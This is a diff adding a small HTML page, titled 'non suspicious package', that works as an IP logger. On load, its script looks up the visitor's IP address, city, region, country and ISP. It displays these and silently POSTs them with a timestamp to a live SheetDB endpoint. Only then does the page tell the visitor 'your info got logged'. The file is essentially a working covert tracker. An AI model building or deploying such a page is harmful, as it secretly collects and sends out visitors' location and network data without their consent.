@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>non suspicious package</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+      background-color: black;
+      color: white; 
+    }
+    p {
+      margin: 8px 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>Your IP Info:</h1>
+  <p id="ip">Loading IP...</p>
+  <p id="location">Loading location...</p>
+  <p id="time">Loading time...</p>
+
+  <script>
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const ipData = {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          isp: data.org,
+          time: new Date().toLocaleString()
+        };
+
+        // Display on the page
+        document.getElementById('ip').textContent = `IP: ${ipData.ip}`;
+        document.getElementById('location').textContent =
+          `Location: ${ipData.city}, ${ipData.region}, ${ipData.country} | ISP: ${ipData.isp}`;
+        document.getElementById('time').textContent = `Time: ${ipData.time}`;
+
+        // Send to SheetDB
+        fetch('https://sheetdb.io/api/v1/8wvumuh9jaw2d', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ data: ipData })
+        });
+      })
+      .catch(err => {
+        console.error('IP fetch failed:', err);
+        document.getElementById('ip').textContent = 'Could not get IP info.';
+      });
+  </script>
+
+ <!-- <a href="https://imgflip.com/i/a0doou"><img src="https://i.imgflip.com/a0doou.jpg" title=""/></a><div><a href=""></a></div> -->
+<a href="https://imgflip.com/i/a0doou"><img src="2519A4C1-55BC-44A3-A038-4851C225D7C0.jpg" title=""/></a><div><a href=""></a></div>
+  <p>property of birb</p>
+  <p>p.s your info got logged</p>
+  <p>&lt;3 ry ry</p>
+</body>
+</html>
+
+<!-- org crl  2FF30D -->
+<!-- new crl  FFFFFF -->
+
+<!-- org crl  FFFFFF -->
+<!-- new crl  000000 -->
+
+<!-- org back crl  black -->
+<!-- org back crl  white -->
+<!-- connect to api lnk: https://sheetdb.io/api/v1/8wvumuh9jaw2d -->
+
+
+
